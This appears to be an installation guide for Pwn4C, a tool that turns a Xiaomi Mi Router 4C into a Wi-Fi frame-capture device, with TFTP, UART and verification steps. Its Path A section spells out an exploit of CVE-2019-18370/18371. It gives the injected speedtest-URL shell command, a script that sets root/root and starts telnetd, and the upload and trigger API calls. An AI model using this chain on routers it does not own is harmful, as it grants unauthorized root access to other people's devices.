# Installation Guide

## Prerequisites

| Requirement | Details |
|-------------|---------|
| Xiaomi Mi Router 4C (R4CM) | Stock firmware (for Path A) or any state (for Path B) |
| Ethernet cable | Cat5e or better, direct connection Host to Drone |
| Host PC | Linux, macOS, or Windows with Go 1.21+ installed |
| USB-UART adapter (optional) | 3.3V logic (e.g., CP2102) for serial console recovery |

---

## Path A: Automated Zero-Touch Installation (Recommended)

This is the simplest method. The Go client exploits a known command injection vulnerability in stock Xiaomi firmware (CVE-2019-18370/18371) to automatically deploy the Pwn4C firmware. No manual flashing, TFTP servers, or serial adapters required.

### Requirements

- The router must be running **stock Xiaomi firmware** vulnerable to CVE-2019-18370/18371. Field-tested on R4CM (Mi Router 4C):
  | Firmware | Result |
  |----------|--------|
  | China `2.14.75`–`2.14.92` | Vulnerable (community-reported) |
  | Global `3.0.23` | Vulnerable (**verified 2026-10-09**: gains root shell, ports 21/22/23 open) |
  | China `2.14.502` (latest) | **Patched** — `c_upload` rejects every archive (`code 1629`, even for empty files). Downgrade first. |
- The Host must be on the **same LAN segment** as the router. Connect via Ethernet to any LAN port, or join the router's default Wi-Fi network.

### A.1 Install the Go Client

**Option 1: Build from source**

```bash
git clone https://github.com/3lyly0/Pwn4C.git
cd Pwn4C/cmd/pwn4c
go build -ldflags="-s -w" -o pwn4c .
sudo cp pwn4c /usr/local/bin/
```

The repository vendors `internal/exploit/assets/busybox-mipsel`, which is
compiled into the CLI with `//go:embed`. If your source checkout is missing
that file, place a compatible statically linked MIPSel BusyBox binary at
`internal/exploit/assets/busybox-mipsel` before building.

**Option 2: Download pre-built binary**

Download the appropriate binary from the [GitHub Releases](https://github.com/3lyly0/Pwn4C/releases) page:

```
pwn4c-linux-amd64
pwn4c-linux-arm64
pwn4c-darwin-amd64
pwn4c-darwin-arm64
pwn4c-windows-amd64.exe
```

Verify integrity:

```bash
sha256sum -c checksums.sha256
```

### A.2 Run the Infect Command

Connect the Host to any LAN port on the stock Xiaomi router. The router's default IP is `192.168.31.1`.

```bash
pwn4c infect 192.168.31.1
```

You will be prompted for the router admin password. What `infect` does, stage by stage (CVE-2019-18370/18371):

1. **Scrape + authenticate** — GETs `/cgi-bin/luci/web`, extracts `deviceId` (MAC) and `key`, derives the `nonce`/`sha1` login hash, and POSTs to `api/xqsystem/login` to obtain the session token (`stok`).
2. **Build payload** — builds a `tar.gz` in memory containing:
   - `speedtest_urls.xml`: a copy of the stock speedtest list, but the `class type="2"` URL is replaced with `http://<router-ip> -q -O /dev/null;((sh /tmp/script.sh exploit) &);exit;wget ...` — command injection executed when the router runs its speed test.
   - `script.sh`: sets the `root/root` password, makes the extracted BusyBox executable, starts `telnetd`, and also tries the stock Dropbear init script.
   - `busybox`: the MIPSel BusyBox binary is **embedded in the tarball** (vendored in `internal/exploit/assets/busybox-mipsel` and compiled into the Go binary). After extraction it is already at `/tmp/busybox`.
3. **Upload** — POSTs the tarball to `api/misystem/c_upload` as multipart `files={"image": ...}` with a `python-requests` User-Agent.
4. **Trigger** — GETs `api/xqnetdetect/netspeed?<port>`. The router unpacks the archive to `/tmp`, runs the poisoned speed test, and the injected shell starts `/tmp/busybox telnetd`.
5. **Verify** — waits ~10s, then probes ports 23/22. Open = root shell ready (`root`/`root`).

No router internet access is needed, and no inbound connection to the host is required for the shell stage. With `--flash`, the host starts a local TCP server only to serve the sysupgrade image; the shell itself still comes from the embedded BusyBox.

Expected output (success):

```
[*] Target: 192.168.31.1
[*] Enter router admin password:
[*] 1. Scraping router metadata (MAC & Key)...
[*] 2. Authenticating against router API...
[+] Session Token (stok) acquired: <redacted-32-hex-chars>
[*] 3. Detected Host PC Local IP: 192.168.31.74
[*] 4. No local TCP server needed: busybox is embedded in the payload
[*] 5. Building air-gapped payload (embedded busybox-mipsel)...
    -> payload size=<compressed-size> sha256=...
[*] 6. Uploading tarball to router (Raw HTTP POST)...
    -> Archive accepted successfully (code 0)!
[*] 7. Triggering command injection...
[*] Waiting 10 seconds for the router to extract the payload and start telnetd...

[+] Done! Root shell is ready on 192.168.31.1
    telnet 192.168.31.1          (user: root, password: root)
    ssh root@192.168.31.1       (password: root)
[+] Infection complete.
```

> **Note on `code 1629`:** some firmware (e.g. Global `3.0.23`) answers the upload with `{"code":1629,"msg":"解压失败..."}` **and still extracts + executes the payload**. `infect` therefore treats a non-zero upload code as a warning, continues to the trigger stage, and lets the port check decide. Only if ports 23/22 stay closed is the run reported as failed (usually: patched firmware — see below). Details in [troubleshooting.md](troubleshooting.md#router-rejected-archive-code1629-解压失败可能文件已经损坏).

> **Current scope (Path A):** `infect` ends with a verified **root shell** (telnet/SSH on the stock Xiaomi firmware).
> The next manual step is to flash the Pwn4C OpenWrt image from that shell:
> ```bash
> # From telnet 192.168.31.1 (root/root):
> # 1. On the host, serve the sysupgrade image:
> python3 -m http.server 8080 --directory ./firmware/output/
> # 2. On the router (telnet):
> wget http://<host-ip>:8080/pwn4c-firmware-mi4c-sysupgrade.bin -O /tmp/pwn4c.bin
> mtd -r write /tmp/pwn4c.bin OS1
> # Router reboots into Pwn4C OS. Reconnect on 192.168.4.0/24.
> ```
> Full automation of the flash+reboot+discovery sequence is planned for a future release.

### A.3 Post-Infection Network Setup

Right after `infect`, the router still runs stock firmware on `192.168.31.0/24` — verify the shell first:

```bash
telnet 192.168.31.1   # user: root, password: root
```

Once the Pwn4C OpenWrt image is flashed (next stage), the Drone will operate on the `192.168.4.0/24` subnet instead. Reconnect the Host directly to any LAN port on the Drone. The Drone's built-in DHCP server assigns the Host an address automatically.

If DHCP does not work, set a static IP:

```bash
# Linux
sudo ip addr flush dev eth0
sudo ip addr add 192.168.4.10/24 dev eth0
sudo ip link set eth0 up
```

### A.4 What If `infect` Fails?

| Failure | Cause | Solution |
|---------|-------|----------|
| `unable to extract deviceId/key` | Router web page unreachable or changed layout | Check LAN link/IP; the router must serve `/cgi-bin/luci/web` |
| `login rejected` | Wrong admin password | Re-enter the password set in the Xiaomi admin panel |
| `upload code=1629` + ports closed | Patched firmware (e.g. China `2.14.502` rejects all archives) | Downgrade to a vulnerable build (`2.14.75`–`2.14.92`, Global `3.0.23`), or use Path B |
| `telnet (23) and ssh (22) are both closed` | Injection did not execute, wrong admin password, or LAN/host firewall issue | Retry once; check the password; try `telnet 192.168.31.1` manually; confirm the host is on the router's LAN (not WAN) and has no firewall blocking outbound LAN traffic; if persistent, use Path B |
| `mtd write failed` | Insufficient `/tmp` space or flash write error | Reboot router to stock, retry. If persistent, use UART |

See [troubleshooting.md](troubleshooting.md#exploit-failures) for detailed diagnosis.

---

## Path B: Manual Build and Advanced Installation

Use this path if:
- The stock firmware is patched and `pwn4c infect` fails.
- You want to build the firmware from source with custom modifications.
- You need to recover a bricked Drone.

### B.1 Build the Firmware from Source

The firmware build uses the OpenWrt ImageBuilder inside a Docker container:

```bash
git clone https://github.com/3lyly0/Pwn4C.git
cd Pwn4C/firmware
docker build -t pwn4c-builder .
docker run --rm -v $(pwd)/output:/output pwn4c-builder
```

The output directory will contain:

```
output/
  pwn4c-firmware-mi4c-sysupgrade.bin   # Sysupgrade flashable image
  checksums.sha256                      # Integrity hash
```

To build without Docker, install the OpenWrt ImageBuilder for `ramips/mt76x8` manually and run:

```bash
cd Pwn4C/firmware
./build.sh
```

See [firmware/README.md](../firmware/README.md) for build dependencies.

### B.2 Flash via TFTP (Stock Recovery Mode)

The stock Xiaomi bootloader includes a TFTP-based recovery mechanism.

**Step 1: Enter recovery mode**

1. Power off the router.
2. Hold the RESET button (pinhole on the back).
3. While holding RESET, power on.
4. Continue holding until the front LED blinks amber rapidly (~10 seconds).
5. Release RESET. The router is now in recovery mode at `192.168.1.1`.

**Step 2: Configure Host network**

```bash
# Linux
sudo ip addr flush dev eth0
sudo ip addr add 192.168.1.2/24 dev eth0
sudo ip link set eth0 up

# macOS
sudo ifconfig en0 192.168.1.2 netmask 255.255.255.0 up
```

```powershell
# Windows (PowerShell, as Administrator)
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.2 -PrefixLength 24
```

Verify: `ping 192.168.1.1`

**Step 3: Transfer via TFTP**

```bash
# Linux / macOS
tftp 192.168.1.1
> binary
> put pwn4c-firmware-mi4c.bin
> quit
```

```powershell
# Windows (enable TFTP Client via Windows Features first)
tftp -i 192.168.1.1 PUT pwn4c-firmware-mi4c.bin
```

Transfer takes 20-40 seconds. The LED blinks during flash write. **Do not power off during this process.**

**Step 4: Wait for reboot**

The router reboots automatically after flashing. First boot takes 45-60 seconds (JFFS2 overlay initialization). The LED turns solid blue when `pwn4cd` is ready.

### B.3 Flash via UART Serial Console

Use this if recovery mode is inaccessible (corrupted bootloader env) or the router is bricked.

1. Connect a 3.3V USB-UART adapter to header J1 (see [hardware.md](hardware.md#uart-serial-console)).
2. Open a serial terminal at 115200 8N1 (e.g., `screen /dev/ttyUSB0 115200`).
3. Power on the router and press any key within 1 second to interrupt U-Boot.
4. At the U-Boot prompt, configure TFTP and flash:

```
MT7628 # setenv serverip 192.168.1.2
MT7628 # setenv ipaddr 192.168.1.1
MT7628 # tftpboot 0x80010000 pwn4c-firmware-mi4c.bin
MT7628 # erase 0xbc050000 +${filesize}
MT7628 # cp.b 0x80010000 0xbc050000 ${filesize}
MT7628 # bootm 0xbc050000
```

This method bypasses all software-level recovery mechanisms.

---

## Verification

After flashing (via either Path A or Path B), verify the Drone is operational.

### Network Setup

Connect the Host to any **LAN port** on the Drone. The Drone runs DHCP on `192.168.4.0/24`. Alternatively, configure a static IP:

```bash
sudo ip addr add 192.168.4.10/24 dev eth0
sudo ip link set eth0 up
```

### Test Autodiscovery

```bash
pwn4c discover
```

Expected:

```
[*] Broadcasting discovery on 255.255.255.255:4440...
[+] Drone found!
    Address:    192.168.4.1
    Firmware:   pwn4c-0.1.0
    Uptime:     47s
    Radio:      MT7628N 2.4GHz (idle)
    Protocol:   v1
```

### Test Control Channel

```bash
pwn4c status
```

Expected:

```
[*] Connecting to 192.168.4.1:4444...
[+] Connected.
    State:        idle
    Channel:      1
    Monitor:      off
    Uptime:       2m13s
    Firmware:     pwn4c-0.1.0
```

### Test Frame Capture

```bash
pwn4c monitor --channel 6 --output test.pcap --duration 10s
```

Expected:

```
[+] Monitor active on channel 6.
[*] Received 1,247 frames in 10.0s (avg 124.7 fps)
[*] Dropped: 0 frames (0.00%)
[*] Saved: test.pcap (487 KB)
```

Verify with Wireshark:

```bash
tshark -r test.pcap -c 5
```

### Test SSH Emergency Access

```bash
ssh root@192.168.4.1
```

Default: `root` with no password. Change immediately:

```bash
passwd
```

### Verification Checklist

| Check | Command | Expected |
|-------|---------|----------|
| Drone reachable | `ping 192.168.4.1` | Reply |
| Discovery works | `pwn4c discover` | Drone found |
| Control channel | `pwn4c status` | State: idle |
| Frame capture | `pwn4c monitor --channel 6 --duration 5s` | Frames received |
| SSH access | `ssh root@192.168.4.1` | Shell prompt |
